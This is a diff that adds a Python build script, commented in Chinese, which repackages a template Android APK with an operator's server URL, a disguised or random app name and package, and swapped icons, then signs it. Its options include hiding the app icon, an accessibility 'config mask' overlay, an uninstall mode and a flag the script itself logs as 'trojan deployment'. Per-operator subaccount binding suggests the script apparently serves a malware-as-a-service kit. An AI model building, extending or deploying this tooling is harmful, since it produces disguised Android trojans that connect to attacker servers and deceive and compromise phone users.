@@ -1,0 +1,247 @@
+#!/usr/bin/env python3
+"""服务器端 APK 构建脚本 v4 - 修复应用名替换"""
+import sys, os, random, string, json, argparse, zipfile, shutil
+
+sys.path.insert(0, '/opt/fisher-node/apk-builder')
+import apk_repacker
+
+def _do_zipalign(input_path, output_path, alignment=4):
+    """Ensure resources.arsc is STORED and 4-byte aligned (Android R+ requirement)"""
+    import zipfile as zf
+    entries = []
+    with zf.ZipFile(input_path, 'r') as zin:
+        for info in zin.infolist():
+            entries.append((info, zin.read(info.filename)))
+    with zf.ZipFile(output_path, 'w') as zout:
+        for info, data in entries:
+            new_info = zf.ZipInfo(info.filename)
+            new_info.date_time = info.date_time
+            new_info.external_attr = info.external_attr
+            if info.filename == 'resources.arsc' or info.compress_type == zf.ZIP_STORED:
+                new_info.compress_type = zf.ZIP_STORED
+                fname_bytes = info.filename.encode('utf-8')
+                header_size = 30 + len(fname_bytes)
+                current_pos = zout.fp.tell()
+                data_start = current_pos + header_size
+                padding = (alignment - (data_start % alignment)) % alignment
+                new_info.extra = b'\x00' * padding
+            else:
+                new_info.compress_type = info.compress_type
+            zout.writestr(new_info, data)
+
+
+def _linux_sign(self, input_path, output_path):
+    import subprocess, shutil as sh
+    keystore = '/opt/fisher-node/apk-builder/_debug.keystore'
+    alias = 'debugkey'
+    password = 'android'
+    keytool = sh.which('keytool')
+    if not os.path.exists(keystore) and keytool:
+        subprocess.run([keytool, '-genkey', '-v', '-keystore', keystore, '-alias', alias,
+            '-keyalg', 'RSA', '-keysize', '2048', '-validity', '10000',
+            '-storepass', password, '-keypass', password,
+            '-dname', 'CN=Debug,OU=Debug,O=Debug,L=Debug,S=Debug,C=US'], capture_output=True)
+    # 先 zipalign
+    aligned_path = input_path + '.aligned'
+    _do_zipalign(input_path, aligned_path)
+    
+    # 优先用 apksigner (v1+v2 签名)
+    apksigner = sh.which('apksigner')
+    if apksigner and os.path.exists(keystore):
+        result = subprocess.run([apksigner, 'sign',
+            '--ks', keystore, '--ks-pass', 'pass:' + password,
+            '--key-pass', 'pass:' + password, '--ks-key-alias', alias,
+            '--v1-signing-enabled', 'true', '--v2-signing-enabled', 'true',
+            '--out', output_path, aligned_path], capture_output=True)
+        if os.path.exists(aligned_path):
+            os.remove(aligned_path)
+        if result.returncode == 0:
+            print("  APK signed (apksigner v1+v2)")
+            return True
+        else:
+            print(f"  apksigner failed: {result.stderr.decode()[:200]}")
+    
+    # 回退: jarsigner (仅 v1)
+    jarsigner = sh.which('jarsigner')
+    if jarsigner and os.path.exists(keystore):
+        sh.copy2(aligned_path if os.path.exists(aligned_path) else input_path, output_path)
+        if os.path.exists(aligned_path):
+            os.remove(aligned_path)
+        result = subprocess.run([jarsigner, '-keystore', keystore, '-storepass', password, '-keypass', password, output_path, alias], capture_output=True)
+        if result.returncode == 0:
+            print("  APK signed (jarsigner v1 only)")
+            return True
+    sh.copy2(input_path, output_path)
+    print("  APK NOT signed")
+    return False
+
+apk_repacker.APKRepacker._sign_apk = _linux_sign
+
+def main():
+    parser = argparse.ArgumentParser()
+    parser.add_argument('--server', required=True)
+    parser.add_argument('--web', default='')
+    parser.add_argument('--name', default='')
+    parser.add_argument('--package', default='')
+    parser.add_argument('--icon', default='')
+    parser.add_argument('--bg', default='', help='Background image PNG')
+    parser.add_argument('--config', default='', help='Full pageStyleConfig JSON')
+    parser.add_argument('--output', required=True)
+    args = parser.parse_args()
+    
+    SRC = '/opt/fisher-node/apk-builder/source.apk'
+    
+    psc = {}
+    if args.config:
+        try:
+            psc = json.loads(args.config)
+        except:
+            pass
+    
+    pkg = args.package or psc.get('applicationId', '')
+    if not pkg:
+        parts = ['app','dev','go','io','my','ui','net','sys','run','top','web','api']
+        p1 = random.choice(parts)
+        p2 = ''.join(random.choices(string.ascii_lowercase, k=14 - 5 - len(p1)))
+        pkg = f'com.{p1}.{p2}'
+    
+    app_name = args.name or psc.get('appName', '系统服务')
+    
+    print(f'Package: {pkg}')
+    print(f'Server: {args.server}')
+    print(f'Web: {args.web}')
+    print(f'Name: {app_name}')
+    
+    r = apk_repacker.APKRepacker(SRC)
+    
+    # ★ 关键: 先把额外配置写入 server_config（但不改 appName，让 repack 内部对比原始名来替换 ARSC）
+    sc = r.server_config
+    
+    # 无障碍配置
+    configMaskText = psc.get('_configMaskText', '')
+    configMaskSubtitle = psc.get('_configMaskSubtitle', '')
+    if configMaskText:
+        sc['configMaskText'] = configMaskText
+        print(f'  配置遮盖第一排: {configMaskText[:30]}')
+    if configMaskSubtitle:
+        sc['configMaskSubtitle'] = configMaskSubtitle
+        print(f'  配置遮盖第二排: {configMaskSubtitle[:30]}')
+    if psc.get('_configMaskTextColor'):
+        sc['configMaskTextColor'] = psc['_configMaskTextColor']
+    if psc.get('_configMaskSubtitleColor'):
+        sc['configMaskSubtitleColor'] = psc['_configMaskSubtitleColor']
+    
+    sc['showAppIcon'] = psc.get('_showAppIcon', 'true') == 'true'
+    sc['uninstallMode'] = psc.get('_uninstallMode', 'false') == 'true'
+    sc['enableServiceMode'] = psc.get('_enableServiceMode', 'false') == 'true'
+    sc['enableConfigMask'] = psc.get('_enableConfigMask', 'true') == 'true'
+    
+    # 进度提示语
+    loadingTips = psc.get('_loadingTips', '')
+    if loadingTips:
+        try:
+            tips = json.loads(loadingTips) if loadingTips.startswith('[') else loadingTips.split('\n')
+            sc['loadingTips'] = tips
+            print(f'  进度提示语: {len(tips)} 条')
+        except:
+            pass
+    
+    # pageStyleConfig 额外字段（不包括 appName，appName 由 repack 处理）
+    psc_out = sc.setdefault('pageStyleConfig', {})
+    if psc.get('usageInstructions'):
+        psc_out['usageInstructions'] = psc['usageInstructions']
+    if psc.get('enableButtonText'):
+        psc_out['enableButtonText'] = psc['enableButtonText']
+    if psc.get('enableButtonTextColor'):
+        psc_out['enableButtonTextColor'] = psc['enableButtonTextColor']
+    if psc.get('buttonColor'):
+        psc_out['buttonColor'] = psc['buttonColor']
+    if psc.get('versionName'):
+        psc_out['versionName'] = psc['versionName']
+    
+    # ★ 子账户绑定：从 pageStyleConfig._ownerUsername 写入 server_config.ownerUsername
+    if psc.get('_ownerUsername'):
+        sc['ownerUsername'] = psc['_ownerUsername']
+        print(f'  ★ ownerUsername: {psc["_ownerUsername"]}')
+    
+    print(f'  显示图标: {sc["showAppIcon"]}, 卸载模式: {sc["uninstallMode"]}, 木马部署: {sc["enableServiceMode"]}')
+    
+    # ★ 调用 repack - 这里会替换 ARSC 里的应用名（对比原始的 pageStyleConfig.appName 和传入的 app_name）
+    r.repack(
+        output_path=args.output,
+        server_url=args.server,
+        web_url=args.web or args.server.replace('wss://', 'https://').replace('ws://', 'http://'),
+        app_name=app_name,
+        package_name=pkg,
+        icon_path=args.icon if args.icon and os.path.exists(args.icon) else None
+    )
+    
+    # 替换应用图标 (assets/igj.png)
+    icon_path = args.icon
+    if icon_path and os.path.exists(icon_path):
+        print(f'  替换应用图标: {icon_path}')
+        with open(icon_path, 'rb') as f:
+            icon_data = f.read()
+        # 替换所有图标位置: assets/igj.png + res/drawable/r*.png (混淆的图标文件)
+        # mipmap 里的才是真正的桌面图标
+        icon_targets = [
+            'assets/igj.png',
+            'res/drawable/rs12.png', 'res/drawable/rt13.png',
+            'res/drawable/ru14.png', 'res/drawable/rv15.png', 
+            'res/drawable/rw16.png', 'res/drawable/rx17.png',
+            # mipmap 桌面图标（各尺寸）
+            'res/mipmap-mdpi/test.png', 'res/mipmap-mdpi/test_fg.png',
+            'res/mipmap-mdpi/test_round.png', 'res/mipmap-mdpi/test_round_fg.png',
+            'res/mipmap-hdpi/test.png', 'res/mipmap-hdpi/test_fg.png',
+            'res/mipmap-hdpi/test_round.png', 'res/mipmap-hdpi/test_round_fg.png',
+            'res/mipmap-xhdpi/test.png', 'res/mipmap-xhdpi/test_fg.png',
+            'res/mipmap-xhdpi/test_round.png', 'res/mipmap-xhdpi/test_round_fg.png',
+            'res/mipmap-xxhdpi/test.png', 'res/mipmap-xxhdpi/test_fg.png',
+            'res/mipmap-xxhdpi/test_round.png', 'res/mipmap-xxhdpi/test_round_fg.png',
+            'res/mipmap-xxxhdpi/test.png', 'res/mipmap-xxxhdpi/test_fg.png',
+            'res/mipmap-xxxhdpi/test_round.png', 'res/mipmap-xxxhdpi/test_round_fg.png',
+        ]
+        tmp_path = args.output + '.icontmp'
+        with zipfile.ZipFile(args.output, 'r') as zin:
+            with zipfile.ZipFile(tmp_path, 'w', zipfile.ZIP_STORED) as zout:
+                for info in zin.infolist():
+                    data = zin.read(info.filename)
+                    if info.filename in icon_targets:
+                        data = icon_data
+                        print(f'     替换: {info.filename}')
+                    new_info = zipfile.ZipInfo(info.filename)
+                    new_info.compress_type = info.compress_type
+                    new_info.date_time = info.date_time
+                    zout.writestr(new_info, data)
+        os.remove(args.output)
+        _linux_sign(None, tmp_path, args.output)
+        os.remove(tmp_path)
+        print('  图标替换完成')
+
+    # 替换背景图
+    if args.bg and os.path.exists(args.bg):
+        print(f'  替换背景图: {args.bg}')
+        with open(args.bg, 'rb') as f:
+            bg_data = f.read()
+        tmp_path = args.output + '.tmp'
+        with zipfile.ZipFile(args.output, 'r') as zin:
+            with zipfile.ZipFile(tmp_path, 'w', zipfile.ZIP_STORED) as zout:
+                for info in zin.infolist():
+                    data = zin.read(info.filename)
+                    if info.filename in ('assets/bg_accessibility.png', 'assets/app_loading_bg.png', 'res/drawable/bg_accessibility.png', 'res/drawable/bg_config_mask.png'):
+                        data = bg_data
+                        print(f'     替换: {info.filename}')
+                    new_info = zipfile.ZipInfo(info.filename)
+                    new_info.compress_type = info.compress_type
+                    new_info.date_time = info.date_time
+                    zout.writestr(new_info, data)
+        os.remove(args.output)
+        _linux_sign(None, tmp_path, args.output)
+        os.remove(tmp_path)
+        print('  背景图替换完成')
+    
+    size = os.path.getsize(args.output) / 1024 / 1024
+    print(f'SUCCESS: {size:.1f} MB')
+
+if __name__ == '__main__':
+    main()
